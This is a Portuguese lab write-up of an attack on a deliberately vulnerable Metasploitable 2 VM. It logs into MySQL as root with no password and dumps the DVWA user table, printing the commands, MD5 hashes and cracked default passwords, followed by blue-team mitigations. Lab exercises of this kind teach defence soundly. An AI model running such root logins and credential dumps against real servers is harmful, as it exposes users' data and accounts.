# Ataque 05 — MySQL sem Password + Extração de Dados

![Categoria](https://img.shields.io/badge/categoria-base%20de%20dados-red?style=flat-square)
![Ferramenta](https://img.shields.io/badge/ferramenta-MySQL-blue?style=flat-square)
![Alvo](https://img.shields.io/badge/alvo-Metasploitable%202-orange?style=flat-square)
![Resultado](https://img.shields.io/badge/resultado-dados%20extraídos-brightgreen?style=flat-square)

## Objetivo

Aceder à base de dados MySQL do Metasploitable sem autenticação
e extrair credenciais de utilizadores armazenadas em texto claro.

## Contexto

O MySQL no Metasploitable está configurado sem password para o
utilizador root — um erro gravíssimo de configuração extremamente
comum em servidores mal configurados. No mundo real, bases de dados
expostas sem autenticação são uma das vulnerabilidades mais críticas
que um pentester pode encontrar.

## Acesso ao MySQL

Via SSH com escalada de privilégios:
```bash
ssh -o "HostKeyAlgorithms=+ssh-rsa" msfadmin@10.0.2.4
sudo su
mysql -u root
```

O MySQL abriu sem pedir qualquer password — acesso imediato.

## Bases de Dados Encontradas

```sql
show databases;
```

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
```

## Extração de Credenciais — DVWA

```sql
use dvwa;
show tables;
select * from users;
```

Resultado — credenciais extraídas:

| Utilizador | Hash MD5 | Password Real |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

**Observação crítica:** O admin e o smithy têm o mesmo hash —
significa que usam a mesma password (`password`).
O hash MD5 `5f4dcc3b5aa765d61d8327deb882cf99` é um dos mais
conhecidos em cibersegurança — é o hash de `password`.

## Impacto

Aceder a uma base de dados sem autenticação permite:
- Ler todos os dados de utilizadores
- Modificar ou apagar dados
- Injetar dados maliciosos
- Usar as credenciais para aceder a outros sistemas

## Mitigação (Perspetiva Blue Team)

- Nunca configurar bases de dados sem password
- Não expor o MySQL na rede — usar apenas localhost
- Usar passwords fortes e únicas para cada utilizador
- Encriptar passwords com algoritmos modernos (bcrypt, não MD5)
- Auditar regularmente acessos à base de dados
